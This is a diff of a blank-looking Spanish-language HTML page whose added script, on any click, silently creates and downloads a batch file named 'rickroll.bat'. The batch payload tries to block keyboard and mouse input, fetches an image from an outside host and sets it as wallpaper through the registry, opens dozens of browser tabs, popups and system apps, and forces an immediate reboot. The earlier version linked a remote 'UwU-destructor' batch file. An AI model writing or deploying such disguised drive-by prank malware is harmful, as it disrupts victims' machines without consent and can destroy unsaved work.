@@ -1,26 +1,107 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
 <meta charset="UTF-8">
-<title></title>
+<title>...</title>
 <style>
 html, body {
   margin: 0;
-  width: 100%;
+  padding: 0;
   height: 100%;
   background: white;
-}
-a {
-  display: block;
-  width: 100%;
-  height: 100%;
+  cursor: pointer;
 }
 </style>
 </head>
 <body>
 
-<a href="https://raw.githubusercontent.com/picolasYT/UwU-destructor/main/UwU.bat"
-   download="UwU.bat"></a>
+<script>
+document.body.addEventListener("click", () => {
+
+  // Contenido del .bat
+  const contenidoBat = `@echo off
+echo INICIANDO CAOS ABSOLUTO CON REINICIO FINAL AJJAJAJAJAJ
+
+:: Bloquear teclado y ratón temporalmente
+echo Bloqueando controles...
+rundll32.exe user32.dll,BlockInput
+
+:: Volumen al MÁXIMO
+echo VOLUMEN AL MÁXIMO...
+for /L %%i in (1,1,15) do (
+    powershell -c "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"
+)
+
+:: Fondo CHAMOI
+echo APLICANDO FONDO CHAMOI...
+powershell -Command "Invoke-WebRequest -Uri 'https://files.catbox.moe/e9uh10.jpg' -OutFile '%temp%\chamoi.jpg'"
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%temp%\chamoi.jpg" /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d "10" /f
+rundll32.exe user32.dll,UpdatePerUserSystemParameters
+
+:: 30 VENTANAS DE RICKROLL
+echo LANZANDO 30 RICKROLLS...
+for /L %%i in (1,1,30) do (
+    start "" "https://youtu.be/f_WuRfuMXQw?si=a-ZHHZuWollALawa"
+    timeout /t 1 /nobreak >nul
+)
+
+:: 50 VENTANAS EMERGENTES AUTOMÁTICAS
+echo BOMBARDEO DE 50 VENTANAS...
+for /L %%i in (1,1,50) do (
+    echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\caos%%i.vbs
+    echo oWS.Popup "CAOS NIVEL %%i/50 - RICKROLL ETERNO! 😈", 2, "APOCALIPSIS", 16 >> %temp%\caos%%i.vbs
+    start wscript %temp%\caos%%i.vbs
+)
+
+:: Abrir aplicaciones aleatorias del sistema
+echo ABRIENDO APLICACIONES DEL SISTEMA...
+start notepad
+start calc
+start mspaint
+start cmd
+start powershell
+
+:: Desbloquear controles después de 8 segundos
+timeout /t 8 /nobreak >nul
+rundll32.exe user32.dll,BlockInput
+
+:: Mensaje final de REINICIO
+echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\reinicio.vbs
+echo oWS.Popup "¡CAOS COMPLETADO! REINICIANDO EN 5 SEGUNDOS... 😈", 5, "REINICIO INMINENTE", 48 >> %temp%\reinicio.vbs
+start wscript %temp%\reinicio.vbs
+
+echo.
+echo ¡ULTIMO AVISO! REINICIANDO EN 5 SEGUNDOS...
+echo ESTE ES EL FINAL... 🔥
+timeout /t 5 /nobreak >nul
+
+:: REINICIAR LA PC
+echo REINICIANDO SISTEMA...
+shutdown /r /t 0 /f
+
+:: Limpiar (aunque ya se reiniciará)
+del %temp%\caos*.vbs
+del %temp%\reinicio.vbs"
+`;
+
+  // Crear el archivo en memoria
+  const blob = new Blob([contenidoBat], { type: "application/octet-stream" });
+  const url = URL.createObjectURL(blob);
+
+  // Crear descarga
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "rickroll.bat";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  // Liberar memoria
+  URL.revokeObjectURL(url);
+
+});
+</script>
 
 </body>
 </html>
